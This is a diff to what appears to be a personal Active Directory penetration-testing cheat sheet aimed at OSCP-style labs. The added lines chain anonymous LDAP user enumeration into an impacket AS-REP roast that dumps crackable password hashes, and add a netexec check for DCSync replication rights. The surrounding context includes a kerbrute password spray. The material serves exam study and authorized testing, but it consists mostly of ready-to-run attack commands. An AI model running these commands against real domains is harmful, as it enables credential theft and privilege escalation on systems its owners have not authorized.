@@ -134,6 +134,15 @@ kerbrute passwordspray -d $domain --dc $targetip users.txt 'Password1!'
 # 3.3 AS-REP Roast — Users with DoNotRequirePreAuth
 impacket-GetNPUsers $domain/ -dc-ip $targetip -no-pass -usersfile users.txt -format john -outputfile asrep.txt
 
+# 1️⃣ AS-REP ROAST — AUTO USER ENUM VIA LDAP (Dynamic user list)
+# PURPOSE:
+# - Automatically extracts ALL domain users via LDAP.
+# - Creates users.txt automatically → no manual wordlist needed.
+# - Perfect when anonymous LDAP binds are allowed.
+# - Immediately performs AS-REP Roast against all roastable users.
+
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}' > all_users.txt && impacket-GetNPUsers $domain/ -dc-ip $targetip -no-pass -usersfile all_users.txt -format john -outputfile asrep_auto.txt
+
 # LDAP filter for users with DoNotRequirePreAuth
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
 
@@ -446,6 +455,13 @@ sc.exe \\$targetip start dns
 ======================================================================
 # 17. DCSYNC & DCSHADOW ENUMERATION (NO EXPLOIT)
 ======================================================================
+
+# 2️⃣ QUICK DCSYNC PRIVILEGE TEST (NO EXPLOIT — ENUM ONLY)
+# PURPOSE:
+# - Checks if your current user has replication rights.
+# - Detects: DS-Replication-Get-Changes, DS-Replication-Get-Changes-All, etc.
+# - If present → user *can* perform DCSync (OSCP: enumeration allowed, exploit not).
+netexec ldap $targetip -u $user -p "$password" --dacl | grep -Ei "DS-Replication-Get-Changes"
 
 # List privileged groups whose members can DCSync
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(cn=Administrators)" member
